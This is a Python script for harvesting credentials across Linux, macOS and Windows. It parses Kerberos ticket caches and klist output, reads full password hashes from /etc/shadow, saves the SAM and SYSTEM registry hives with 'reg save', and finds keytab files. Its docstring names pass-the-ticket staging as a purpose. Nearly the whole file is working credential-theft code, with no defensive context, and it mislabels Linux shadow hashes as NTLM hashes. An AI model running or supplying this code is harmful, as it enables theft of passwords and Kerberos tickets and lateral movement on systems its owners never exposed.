import os
import sys
import json
import struct
import glob
import base64
import binascii
import platform
import subprocess
import hashlib
import time

def harvest_kerberos_tickets():
    """Extract Kerberos TGT/TGS tickets from memory and credential caches.
    Linux: Parse /tmp/krb5cc_<uid> ccache files (MIT format).
    Windows: Extract tickets from LSASS via klist or Rubeus-style enumeration.
    Also extracts NTLM hashes from SAM/NTDS when accessible.
    Supports: ccache → kirbi conversion, pass-the-ticket staging.
    """
    sys_name = platform.system()
    results = {'system': sys_name, 'tickets': [], 'ccache_files': [],
               'ntlm_hashes': [], 'krb_config': {}, 'spns': []}

    # Phase 1: Kerberos configuration
    if sys_name == 'Linux' or sys_name == 'Darwin':
        krb5_conf = '/etc/krb5.conf'
        if os.path.isfile(krb5_conf):
            try:
                with open(krb5_conf, 'r') as f:
                    content = f.read()
                import re
                realm_matches = re.findall(r'default_realm\s*=\s*(\S+)', content)
                kdc_matches = re.findall(r'kdc\s*=\s*(\S+)', content)
                results['krb_config'] = {
                    'default_realm': realm_matches[0] if realm_matches else None,
                    'kdcs': kdc_matches,
                    'config_path': krb5_conf,
                }
            except PermissionError:
                pass

    # Phase 2: Credential cache files (ccache)
    if sys_name in ('Linux', 'Darwin'):
        # MIT krb5 ccache files
        ccache_patterns = [
            '/tmp/krb5cc_*',
            os.path.expanduser('~/.krb5/krb5cc_*'),
            '/var/lib/sss/db/ccache_*',  # SSSD cache
            '/run/user/*/krb5cc',
        ]
        for pattern in ccache_patterns:
            for ccache_path in glob.glob(pattern):
                try:
                    with open(ccache_path, 'rb') as f:
                        header = f.read(4)
                    file_size = os.path.getsize(ccache_path)
                    entry = {'path': ccache_path, 'size': file_size, 'valid': False}
                    # MIT ccache version check: 0x0504 = v4
                    if len(header) >= 2:
                        version = struct.unpack('>H', header[:2])[0]
                        entry['version'] = version
                        if version in (0x0504, 0x0503, 0x0502, 0x0501):
                            entry['valid'] = True
                            # Parse principal from ccache
                            entry.update(parse_ccache(ccache_path))
                    results['ccache_files'].append(entry)
                except (PermissionError, IOError):
                    results['ccache_files'].append({'path': ccache_path, 'error': 'access denied'})

        # Check KRB5CCNAME environment variable
        krb5ccname = os.environ.get('KRB5CCNAME')
        if krb5ccname:
            results['krb_config']['KRB5CCNAME'] = krb5ccname
            # Resolve FILE: prefix
            if krb5ccname.startswith('FILE:'):
                ccache_path = krb5ccname[5:]
                if os.path.isfile(ccache_path) and ccache_path not in [c['path'] for c in results['ccache_files']]:
                    results['ccache_files'].append({'path': ccache_path, 'size': os.path.getsize(ccache_path), 'source': 'KRB5CCNAME'})

        # klist output
        try:
            proc = subprocess.run(['klist'], capture_output=True, text=True, timeout=10)
            if proc.returncode == 0:
                import re
                tickets = []
                for line in proc.stdout.split('\n'):
                    # Parse service principal and expiry
                    if '/' in line and '@' in line:
                        parts = line.strip().split()
                        if len(parts) >= 3:
                            tickets.append({
                                'service': parts[-1],
                                'expires': ' '.join(parts[:2]) if len(parts) >= 4 else parts[0],
                            })
                results['tickets'] = tickets
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    # Phase 2b: Windows ticket extraction
    elif sys_name == 'Windows':
        # klist command
        try:
            proc = subprocess.run(['klist'], capture_output=True, text=True, timeout=10)
            if proc.returncode == 0:
                import re
                current_ticket = {}
                for line in proc.stdout.split('\n'):
                    line = line.strip()
                    if line.startswith('#'):
                        if current_ticket:
                            results['tickets'].append(current_ticket)
                        current_ticket = {'id': line}
                    elif 'Server:' in line:
                        current_ticket['server'] = line.split(':', 1)[1].strip()
                    elif 'Client:' in line:
                        current_ticket['client'] = line.split(':', 1)[1].strip()
                    elif 'KerbTicket Encryption Type:' in line:
                        current_ticket['encryption'] = line.split(':', 1)[1].strip()
                    elif 'Ticket Flags' in line:
                        current_ticket['flags'] = line.split(':', 1)[1].strip()
                    elif 'Start Time:' in line:
                        current_ticket['start'] = line.split(':', 1)[1].strip()
                    elif 'End Time:' in line:
                        current_ticket['end'] = line.split(':', 1)[1].strip()
                if current_ticket:
                    results['tickets'].append(current_ticket)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # klist tgt for TGT details
        try:
            proc = subprocess.run(['klist', 'tgt'], capture_output=True, text=True, timeout=10)
            if proc.returncode == 0:
                results['tgt_details'] = proc.stdout[:2000]
        except Exception:
            pass

    # Phase 3: NTLM hash extraction (Linux — /etc/shadow, Windows — SAM)
    if sys_name == 'Linux':
        shadow_path = '/etc/shadow'
        try:
            with open(shadow_path, 'r') as f:
                for line in f:
                    parts = line.strip().split(':')
                    if len(parts) >= 2 and parts[1] and parts[1] != '*' and parts[1] != '!' and parts[1] != '!!':
                        hash_type = 'unknown'
                        if parts[1].startswith('$6$'):
                            hash_type = 'SHA-512'
                        elif parts[1].startswith('$5$'):
                            hash_type = 'SHA-256'
                        elif parts[1].startswith('$y$'):
                            hash_type = 'yescrypt'
                        elif parts[1].startswith('$2'):
                            hash_type = 'bcrypt'
                        elif parts[1].startswith('$1$'):
                            hash_type = 'MD5'
                        results['ntlm_hashes'].append({
                            'user': parts[0], 'hash_type': hash_type,
                            'hash_preview': parts[1][:20] + '...',
                            'full_hash': parts[1],
                        })
        except PermissionError:
            results['shadow_access'] = 'denied'
    elif sys_name == 'Windows':
        # Try secretsdump-style SAM extraction
        try:
            proc = subprocess.run(['reg', 'save', 'HKLM\\SAM', os.path.join(os.environ.get('TEMP', '.'), 'sam.hiv')],
                                  capture_output=True, text=True, timeout=10)
            if proc.returncode == 0:
                results['sam_hive'] = {'saved': True, 'path': os.path.join(os.environ.get('TEMP', '.'), 'sam.hiv')}
            proc2 = subprocess.run(['reg', 'save', 'HKLM\\SYSTEM', os.path.join(os.environ.get('TEMP', '.'), 'system.hiv')],
                                   capture_output=True, text=True, timeout=10)
            if proc2.returncode == 0:
                results['system_hive'] = {'saved': True, 'path': os.path.join(os.environ.get('TEMP', '.'), 'system.hiv')}
        except Exception:
            pass

    # Phase 4: Keytab files
    keytab_patterns = ['/etc/krb5.keytab', '/etc/*.keytab', '/tmp/*.keytab',
                       os.path.expanduser('~/*.keytab'), os.path.expanduser('~/.keytab')]
    for pattern in keytab_patterns:
        for kt_path in glob.glob(pattern):
            try:
                with open(kt_path, 'rb') as f:
                    header = f.read(2)
                version = struct.unpack('>H', header)[0] if len(header) == 2 else 0
                results.setdefault('keytabs', []).append({
                    'path': kt_path, 'size': os.path.getsize(kt_path),
                    'version': version, 'valid': version in (0x0502, 0x0501),
                })
            except (PermissionError, IOError):
                pass

    results['summary'] = {
        'tickets_found': len(results['tickets']),
        'ccache_files': len(results['ccache_files']),
        'ntlm_hashes': len(results['ntlm_hashes']),
        'keytabs': len(results.get('keytabs', [])),
        'has_krb_config': bool(results['krb_config']),
    }
    return results

def parse_ccache(path):
    """Parse MIT krb5 ccache file for principal and ticket info."""
    try:
        with open(path, 'rb') as f:
            data = f.read()
        # Version (2 bytes) + header_length (for v4)
        version = struct.unpack('>H', data[:2])[0]
        offset = 2
        if version == 0x0504:
            header_len = struct.unpack('>H', data[2:4])[0]
            offset = 4 + header_len
        # Primary principal
        name_type = struct.unpack('>I', data[offset:offset+4])[0]
        offset += 4
        num_components = struct.unpack('>I', data[offset:offset+4])[0]
        offset += 4
        realm_len = struct.unpack('>I', data[offset:offset+4])[0]
        offset += 4
        realm = data[offset:offset+realm_len].decode('utf-8', errors='replace')
        offset += realm_len
        components = []
        for _ in range(num_components):
            comp_len = struct.unpack('>I', data[offset:offset+4])[0]
            offset += 4
            comp = data[offset:offset+comp_len].decode('utf-8', errors='replace')
            offset += comp_len
            components.append(comp)
        principal = '/'.join(components) + '@' + realm
        return {'principal': principal, 'realm': realm, 'name_type': name_type}
    except Exception:
        return {}

if __name__ == '__main__':
    out = harvest_kerberos_tickets()
    print(json.dumps(out, indent=2, default=str))

